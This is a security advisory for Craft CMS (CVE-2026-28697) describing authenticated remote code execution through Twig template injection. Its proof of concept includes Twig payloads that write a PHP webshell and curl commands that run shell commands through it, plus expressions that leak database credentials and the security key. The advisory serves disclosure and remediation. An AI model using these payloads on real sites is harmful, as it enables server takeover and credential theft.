# [C] Craft CMS Vulnerable to Authenticated RCE via "craft.app.fs.write()" in Twig Templates

## Summary
Severity: Critical
Advisory: GHSA-v47q-jxvr-p68x
CVE: CVE-2026-28697
CWE: CWE-1336
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-03-03
Source: https://github.com/advisories/GHSA-v47q-jxvr-p68x
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=5.0.0-RC1 <5.9.0-beta.1
- Packagist: `craftcms/cms` — affected >=4.0.0-RC1 <4.17.0-beta.1

## Details
## Summary

An authenticated administrator can achieve Remote Code Execution (RCE) by injecting a Server-Side Template Injection (SSTI) payload into Twig template fields (e.g., Email Templates). By calling the `craft.app.fs.write()` method, an attacker can write a malicious PHP script to a web-accessible directory and subsequently access it via the browser to execute arbitrary system commands.

---
## Proof of Concept

### Attack Prerequisites

- Authenticated administrator account with `allowAdminChanges` enabled, or access to the System Messages utility

### Steps to Reproduce

1. Navigate to **Utilities → System Messages** (`/admin/utilities/system-messages`)
2. Edit any email template (e.g., "Test Email") and inject the following in the body (or the Subject):
	- To exploit it by writing to a file system:
		- **Note:** Replace the filesystem handle (e.g., `hardDisk`) with a valid handle configured in the target installation.
		```twig
		{{ craft.app.fs.getFilesystemByHandle('hardDisk').write('shell.php', '<?php isset($_GET["c"]) ? system($_GET["c"]) : null; ?>') }}
		```
	- To exploit it by writing to a volume:
		- **Note:** Replace the volume handle (e.g., `images`) with a valid handle configured in the target installation.
		```twig
		{{ craft.app.volumes.getVolumeByHandle('images').fs.write('shell.php', '<?php isset($_GET["c"]) ? system($_GET["c"]) : null; ?>') }}
		```
	<img width="982" height="901" alt="payload-injection" src="https://github.com/user-attachments/assets/86fbb99c-a551-4395-93a1-30e62e77c57e" />
3. Save & go to **Settings → Email** (`/admin/settings/email`)
4. Click **"Test"** at the bottom of the page to trigger template rendering
5. The webshell is now written to the filesystem/volume. Access it via curl or directly from the browser:
	**Note:** The path might be different on your end depending on the filesystem or volume configuration.
	```bash
	# For Filesystem
	curl "http://target.com/uploads/shell.php?c=id"
	# For Volume
	curl "http://target.com/uploads/images/shell.php?c=id"
	# Example Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
	```
	<img width="791" height="440" alt="rce-poc" src="https://github.com/user-attachments/assets/6a895609-bea0-459a-9659-0d1437f838f4" />

---
## Additional Impact

The same `craft.app` exposure without any security measures enables additional attack vectors:

### Database Credential Disclosure

Database credentials are stored in `.env` outside the webroot and are not accessible to admins through the UI. This bypasses that protection.

```twig
{{ craft.app.db.username }}
{{ craft.app.db.password }}
{{ craft.app.db.dsn }}
```

### Security Key Disclosure

Craft explicitly redacts the security key from phpinfo and error logs, indicating it should be protected. However, `craft.app.config.general.securityKey` bypasses this protection.
```twig
{{ craft.app.config.general.securityKey }}
```
## Recommended Fix
- **Add Twig sandbox rules** to block `write`, `writeFileFromStream`, `deleteFile`, and similar destructive methods
- **Consider allowlist approach** for `craft.app` properties accessible in templates rather than exposing the entire application

## Resources

https://github.com/craftcms/cms/commit/9dc2a4a3ec8e9cd5e8c0d1129f36371437519197
https://github.com/craftcms/cms/pull/18219
https://github.com/craftcms/cms/pull/18216

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-v47q-jxvr-p68x
- https://nvd.nist.gov/vuln/detail/CVE-2026-28697
- https://github.com/craftcms/cms/pull/18216
- https://github.com/craftcms/cms/pull/18219
- https://github.com/craftcms/cms/commit/9dc2a4a3ec8e9cd5e8c0d1129f36371437519197
- https://github.com/craftcms/cms
